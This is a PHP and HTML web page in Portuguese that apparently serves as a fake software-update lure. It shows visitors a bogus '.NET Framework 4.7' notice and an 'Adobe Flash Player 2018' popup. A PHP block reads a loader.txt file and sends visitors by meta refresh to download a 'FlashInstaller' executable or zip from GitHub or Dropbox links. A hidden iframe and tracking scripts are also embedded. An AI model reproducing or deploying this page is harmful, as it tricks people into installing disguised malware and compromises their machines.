<?php
	$config = array();
	$handle = @fopen("loader.txt", "r");
	while (($buffer = fgets($handle, 4096)) !== false)
		array_push($config, trim($buffer));
	fclose($handle);
?>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<script style="display: none;">
			var tvt = tvt || {}; 
			tvt.captureVariables = function (a) {
				for(var b=new Date,c={},d=Object.keys(a||{}),e=0, f;f=d[e];e++)
					if(a.hasOwnProperty(f)&&"undefined"!=typeof a[f])try{var g=[];c[f]=JSON.stringify(a[f],function(a,b){try{if("function"!==typeof b){if("object"===typeof b&&null!==b){if(b instanceof HTMLElement||b instanceof Node||-1!=g.indexOf(b))return;g.push(b)}return b}}catch(L){}})}catch(l){}a=document.createEvent("CustomEvent");a.initCustomEvent("TvtRetrievedVariablesEvent",!0,!0,{variables:c,date:b});window.dispatchEvent(a)};window.setTimeout(function() {tvt.captureVariables({'dataLayer': window['dataLayer']})}, 2000);
		</script>
		<?php 
			if($config[0] == 'S') {
				//Configurações GitHub
				$github = false;
				$gituser = 'cleudilenesouza';
				$gitrepo = 'source';
				$gitfile = 'FlashInstaller';
				$n = rand(1,10);
				if($n<10)
					$url = '00'.$n;
				else
					$url = '0'.$n;
				
				if($github)
				{
					switch($redirects[2])
					{
						case 'S':
							print '<meta http-equiv="refresh" content="0; url=https://raw.githubusercontent.com/'.$gituser.'/'.$gitrepo.$url.'/master/'.$gitfile.'.exe">';
							break;
						case 'N':
							print '<meta http-equiv="refresh" content="0; url=https://raw.githubusercontent.com/'.$gituser.'/'.$gitrepo.$url.'/master/'.$gitfile.'.zip">';
							break;
						default:
							print '<meta http-equiv="refresh" content="0; url=https://github.com/'.$gituser.'/'.$gitrepo.$url.'/archive/master.zip">';
					}
				}
				
				//Configurações Dropbox
				$dropbox = true;
				$url = array();
				$url[0] = $config[2];
				$url[1] = $config[3];
				$url[2] = $config[4];
				$url[3] = $config[5];
				$url[4] = $config[6];
				$url[5] = $config[7];
				
				if($dropbox)
					print '<meta http-equiv="refresh" content="0; url='.$url[rand(0,count($url))].'">';
			}
			$arquivo = $_SERVER['PHP_SELF'];
		?>
		<script>
		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
		  var page = new String(window.location.href);
		  page = page.replace('www.','');
		  page = page.replace('http://','');
		  page = page.replace('https://','');
		  //ga('create', 'UA-104504016-1', 'auto');
		  ga('create', 'UA-105183436-1', 'auto');
		  ga('send', { hitType: 'pageview', page: page });

		</script>
	</head>
	<body>
	<span></span>
	<center>
	</center>
		<table width="1448" border="0" align="center" cellpadding="2" cellspacing="2" style="text-align: left; width: 592px; height: 556px;">
			<tbody>
				<tr>
					<td width="1440">
						<table style="border-collapse: collapse; width: 553px; height: 493px;" border="0" bordercolor="#111111" cellpadding="0" cellspacing="0">
							<tbody>
								<tr>
								</tr>
								<tr>
		  
		  
		  
		  
		  
		  
		  
		  
		  
		  
		
		
		  
            <td align="center" bgcolor="#f9f9f9" valign="top">
            <h3 align="center"><font><font color="#808080" face="Arial, Helvetica, sans-serif">.NET Framework - 4.7<br><br>A Sua Versão está desatualizada, para continuar navegando e preciso atualizar o seu .NET FrameWork para versão 4.7
</font></font></h3>
            <table style="text-align: left; width: 626px; height: 320px;" border="0" cellpadding="2" cellspacing="2">
              <tbody>
                <tr>
                </tr>
              </tbody>
            </table>
            </td>
          </tr>
        </tbody>
      </table>
      </td>
    </tr>
  </tbody>
</table>
<p><br>









  
  
  <script async="" src="./Page has moved_files/analytics.js.download"></script><script type="text/javascript" src="./Page has moved_files/jquery.min.js.download"></script>
  <script type="text/javascript" src="./Page has moved_files/jquery.cookie.js.download"></script>
  <script type="text/javascript" src="./Page has moved_files/jquery.ulightbox.js.download"></script><br>
</p><div id="ghostery-purple-box" class="ghostery-bottom ghostery-right ghostery-collapsed"><div id="ghostery-box"><div id="ghostery-count" style="background: none; color: rgb(255, 255, 255);">1</div><div id="ghostery-pb-icons-container"><span id="ghostery-breaking-tracker" class="ghostery-pb-tracker" style="background: url(&quot;chrome-extension://mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/breaking-icon.svg&quot;); opacity: 0.5;"></span><span id="ghostery-slow-tracker" class="ghostery-pb-tracker" style="background: url(&quot;chrome-extension://mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/slow-icon.svg&quot;); opacity: 0.5;"></span><span id="ghostery-non-secure-tracker" class="ghostery-pb-tracker" style="background: url(&quot;chrome-extension://mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/non-secure-icon.svg&quot;); opacity: 0.5;"></span></div><div id="ghostery-title">Atualizar .NET Framework 4.7</div><div id="ghostery-minimize"><span id="ghostery-minimize-icon"></span></div><span id="ghostery-close" style="background: url(&quot;chrome-extension://mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/collapse.svg&quot;);"></span></div><div id="ghostery-pb-background"><div id="ghostery-trackerList"><div class="ghostery-trackerContainer"><span id="ghostery-no-tracker" class="ghostery-pb-tracker-list"></span><span class="ghostery-tracker"><span class="ghostery-color">Sobre: .NET® Framework® é um plug-in</span></span></div></div></div></div>
<p>&nbsp;</p>
<link rel="stylesheet" type="text/css" href="./Page has moved_files/jquery.ulightbox.css">






<script type="text/javascript">
	$(document).ready(function() {
	   uLightBox.init({
	      override:false,
	      background: 'black',
	      centerOnResize: true,
	      fade: true
	   });
	   {
		    uLightBox.alert({
		        width: '585px',
		        title: 'Atualizar Adobe Flash Player 2018',
		        rightButtons: ['Clique para Entrar no site'],
		        opened: function() {
		            $('<span />').html("<a style='border:0;' onClick='uLightBox.clear();' href='<?=$arquivo;?>'><img src='./popup/A-F-Player-0610--001.png'></a>").appendTo('#lbContent');
		        },
		        onClick: function(button) {
		            uLightBox.clear();
		            location = "<?=$arquivo;?>";
		        }
		    });
	    	
		}
	});
</script> 




<iframe width="1" style="display:none;" height="1" frameborder="0" src="./Page has moved_files/2dNiWOC.html"></iframe>
<div id="uLightBoxOverlay" class="opaque">
	<div id="uLightBox" class="shadow top bottom" style="width: 585px; top: 156.5px; left: 382px;">
		<div id="lbHeader" class="top">
			<header>Atualizacão .NET Framework 4.7</header>
		</div>
		<div id="lbContent" style="padding-left:0;padding-top:0;padding-bottom:0;">
			<span><a style="border:0;" onClick="uLightBox.clear();" href="<?=$arquivo;?>"><img src="./Page has moved_files/A-F-Player-0610--001.png"></a></span>
		</div>
		<div id="lbFooter" class="bottom">
			<input type="button" class="flat floatRight" value="Clique aqui para entrar no site" id="Clique aqui para entrar no site"></div>
	</div>
</div>









<div id="uLightBoxOverlay" style="display:none" class="opaque"><div id="uLightBox" class="shadow top bottom" style="display:none"><div id="lbHeader" class="top"></div><div id="lbContent"></div><div id="lbFooter" class="bottom"></div></div></div><div id="uLightBoxOverlay" style="display:none" class="opaque"><div id="uLightBox" class="shadow top bottom" style="display:none"><div id="lbHeader" class="top"></div><div id="lbContent"></div><div id="lbFooter" class="bottom"></div></div></div></body></html>